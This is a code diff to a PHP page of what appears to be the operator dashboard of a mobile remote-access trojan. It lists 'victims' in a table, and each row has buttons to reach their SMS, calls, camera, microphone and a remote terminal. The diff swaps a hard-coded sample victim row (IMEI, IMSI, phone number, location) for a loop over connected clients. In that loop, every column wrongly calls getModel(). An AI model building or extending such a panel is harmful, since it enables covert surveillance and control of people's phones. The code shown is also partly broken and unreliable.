@@ -1,4 +1,4 @@
-<?php require_once __DIR__ . "header.php"; ?>
+<?php require_once __DIR__ . "/header.php"; ?>
 
 <div class="container">
     <div class="page-title">
@@ -12,33 +12,29 @@
                         <th>Model</th>
                         <th>Device-ID</th>
                         <th>IP Address</th>
-                        <th>IMEI</th>
-                        <th>API</th>
+                        <th>Device API</th>
                         <th>Phone</th>
-                        <th>IMSI</th>
-                        <th>Location</th>
                         <th></th>
                     </tr>
                 </thead>
                 <tbody class="victims-body"> 
-                    <tr>
-                        <td>SM-179As</td>
-                        <td>RF165433C</td>
-                        <td>192.168.12.1</td>
-                        <td>131123456789</td>
-                        <td>23</td>
-                        <td>+234812345678</td>
-                        <td>62 61 12346789</td>
-                        <td>Ikeja, Lagos</td>
-                        <td class="text-end">
-                            <button id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></button>
-                            <button id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></button>
-                            <button id="btn-settings" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-cog"></i></button>
-                            <button id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></button>
-                            <button id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></button>
-                            <button id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></button>
-                        </td>
-                    </tr>           
+                    <?php foreach($clients as $client): ?>
+                      <tr>
+                          <td><?= $client->getModel(); ?></td>
+                          <td><?= $client->getModel(); ?></td>
+                          <td><?= $client->getModel(); ?></td>
+                          <td><?= $client->getModel(); ?></td>
+                          <td><?= $client->getModel(); ?></td>
+                          <td class="text-end">
+                              <button id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></button>
+                              <button id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></button>
+                              <button id="btn-settings" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-cog"></i></button>
+                              <button id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></button>
+                              <button id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></button>
+                              <button id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></button>
+                          </td>
+                      </tr>  
+                    <?php endforeach ?>
                 </tbody>
             </table>
 
@@ -231,4 +227,4 @@
 </div>
 <script src="/src/View/assets/js/initiate-datatables.js"></script>
 
-<?php require_once __DIR__ . "footer.php"; ?>
+<?php require_once __DIR__ . "/footer.php"; ?>
